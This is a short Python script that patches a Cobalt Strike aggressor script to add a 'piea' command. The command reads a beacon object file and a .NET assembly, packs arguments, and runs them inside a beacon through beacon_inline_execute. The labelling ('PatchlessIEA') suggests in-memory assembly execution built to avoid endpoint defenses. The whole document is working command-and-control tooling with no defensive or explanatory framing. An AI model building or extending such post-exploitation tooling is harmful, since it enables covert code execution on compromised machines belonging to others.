# -*- coding: utf-8 -*-
r"""add_piea.py - C-51: piea command (PatchlessIEA) via beacon_inline_execute
with the same ziiiiizzzib contract as iea."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts"
     r"\p3-llvm-bench\tsboot_run\headless_franken.cna")
s = io.open(P, encoding="utf-8").read()

L = chr(10)
TAB = chr(9)
BS2 = chr(92) * 2

anchor = TAB + 'else if ($cmd eq "iea") {'
assert anchor in s, "iea anchor missing"

cmd = (
    TAB + 'else if ($cmd eq "piea") {' + L +
    TAB + TAB + '# C-51: PatchlessIEA (same 11-arg contract as iea)' + L +
    TAB + TAB + '$bof = readb(openf($a1), -1);' + L +
    TAB + TAB + '$asm = readb(openf($a2), -1);' + L +
    TAB + TAB + '$bofArgs = bof_pack($bid, "ziiiiizzzib", "", 0, 1, 1, 0, 1, "obslot", "obpipe", $a3, strlen($asm), $asm);' + L +
    TAB + TAB + 'beacon_inline_execute($bid, $bof, "go", $bofArgs);' + L +
    TAB + TAB + 'log("META", $bid, "piea dispatched asm=" . strlen($asm) . " args=" . $a3);' + L +
    TAB + TAB + 'return;' + L +
    TAB + '}' + L
)
s = s.replace(anchor, cmd + anchor, 1)
io.open(P, "w", encoding="utf-8", newline="").write(s)
print("piea command added (no BOM)")
